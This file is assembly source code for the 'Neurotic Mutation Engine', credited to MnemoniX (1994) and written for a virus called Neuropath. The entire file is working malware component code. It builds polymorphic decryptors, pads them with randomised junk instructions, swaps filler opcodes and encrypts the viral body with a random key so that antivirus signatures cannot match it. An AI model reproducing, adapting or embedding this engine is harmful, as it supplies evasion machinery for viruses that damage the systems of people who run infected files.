; Neurotic Mutation Engine v1.00 for Neuropath
; by MnemoniX 1994

engine          proc    near
                call    randomize

get_reg_1:
                mov     ax,7                    ; counter register
                call    _random
                inc     ax
                cmp     al,4
                je      get_reg_1
                cmp     al,5
                ja      get_reg_1
                mov     ds:reg_1,al

                push    di                      ; save this

                push    ax
                call    garbage_dump            ; crap
                pop     ax

                add     al,0B8h                 ; store MOV instruction
                stosb
                mov     ax,cx
                stosw

                call    garbage_dump            ; more crap

                mov     al,0BFh
                stosb
                push    di                      ; use this later
                stosw

                call    garbage_dump            ; even more crap

                mov     ax,0F78Bh
                stosw

                push    di                      ; use this later too
                call    garbage_dump            ; more crap

                mov     al,0ADh                 ; a LODSW
                stosb

                call    garbage_dump            ; yet more crap

                mov     al,2
                call    _random
                test    al,al
                je      add_it

                mov     al,35h
                mov     bl,al
                je      decryptor
add_it:
                mov     al,5
                mov     bl,2Dh
decryptor:
                stosb
                mov     ds:encrypt_act,bl       ; for encryption

                mov     ax,-1
                call    _random
                stosw
                mov     ds:encrypt_key,ax       ; for encryption
                
                call    garbage_dump            ; just pilin' on the crap

                mov     al,0ABh                 ; a STOSW
                stosb

                call    garbage_dump            ; the crap continues ...

                mov     al,ds:reg_1             ; decrement counter
                add     al,48h
                mov     ah,9Ch                  ; and a PUSHF
                stosw

                call    garbage_dump            ; C-R-A-P ...

                mov     ax,749Dh                ; a POPF and JZ
                stosw
                mov     ax,4
                call    _random                 ; use later
                mov     bx,ax
                add     al,3
                stosb

                mov     al,0E9h                 ; a JMP
                stosb
                pop     ax                      ; use LODSW offset
                sub     ax,di
                dec     ax
                dec     ax
                stosw

                add     di,bx                   ; fix up DI

                pop     bx                      ; now fix up offset value
                pop     bp
                sub     bp,di
                neg     bp
                push    bp                      ; size of decryptor - for l8r
                add     bp,dx
                mov     es:[bx],bp

                push    cx

                push    si
                mov     si,offset one_byters    ; swap one-byte instructions
                mov     ax,7                    ; around for variety
                call    _random
                mov     bx,ax
                mov     al,7
                call    _random
                mov     ah,[bx+si]
                mov     bl,al
                mov     [bx+si],ah
                pop     si

; now we encrypt
encrypt_it:
                lodsw
encrypt_act     db      0
encrypt_key     dw      0
                stosw
                loop    encrypt_it

                pop     cx
                pop     dx
                add     cx,dx
                ret

reg_1           db      0

rnd_seed_1      dw      0
rnd_seed_2      dw      0


garbage_dump:
                mov     ax,7                    ; garbage instructions
                call    _random
                add     ax,5
                push    cx
                mov     cx,ax
dump_it:
; El Basurero - "The GarbageMan"
                mov     ax,8
                call    _random
                cmp     al,2
                jb      next_one
                je      garbage_1       ; a MOV ??,AX
                cmp     al,3
                je      garbage_2       ; operate ??,AX
                cmp     al,4
                je      garbage_3       ; CMP or TEST AX/AL,??
                cmp     al,5            ; a few little instructions
                jae     garbage_4
next_one:
                loop    dump_it
                pop     cx
                ret

garbage_1:
                mov     al,8Bh
                stosb  
                call    get_mov_reg
                shl     ax,1
                shl     ax,1
                shl     ax,1
                add     al,0C0h
                stosb
                jmp     next_one

garbage_2:
                mov     al,8
                call    _random
                shl     ax,1
                shl     ax,1
                shl     ax,1
                add     al,3
                stosb
                call    get_mov_reg
                shl     ax,1
                shl     ax,1
                shl     ax,1
                add     al,0C0h
                stosb
                jmp     next_one

garbage_3:
                mov     al,2
                call    _random
                test    al,al
                je      a_cmp
                mov     al,0A9h
                jmp     storage
a_cmp:
                mov     al,3Dh
storage:
                stosb
                mov     ax,-1
                call    _random
                stosw
                jmp     next_one

garbage_4:
                push    cx
                mov     ax,4
                call    _random
                add     ax,3
                mov     cx,ax
                push    si
                mov     bx,offset one_byters
filler_loop:
                mov     ax,8
                call    _random
                cmp     al,7
                je      make_inc_dec
                mov     si,ax
                mov     al,[bx+si]
proceed:
                stosb
                loop    filler_loop

                pop     si cx
                jmp     next_one

make_inc_dec:
                call    get_mov_reg
                add     al,40h
                jmp     proceed

get_mov_reg:
                mov     ax,8
                call    _random
                test    al,al
                je      get_mov_reg
                cmp     al,4
                je      get_mov_reg
                cmp     al,5
                ja      get_mov_reg
                cmp     al,reg_1
                je      get_mov_reg
                ret

one_byters:
                db      0CCh
                stc
                clc
                cmc
                sti
                nop
                cld

randomize:
                push    cx dx
                xor     ah,ah
                int     1Ah
                mov     rnd_seed_1,dx
                add     dx,cx
                mov     rnd_seed_2,dx
                pop     dx cx
                ret

_random:
                push    cx dx ax
                add     dx,rnd_seed_2
                add     dx,17
                mov     ax,dx
                xor     dx,dx
                test    ax,ax
                je      rnd_done
                pop     cx
                div     cx
                mov     ax,dx                   ; AX now holds our random #
rnd_done:
                mov     dx,rnd_seed_1
                add     rnd_seed_2,dx
                pop     dx cx
                ret

engine          endp
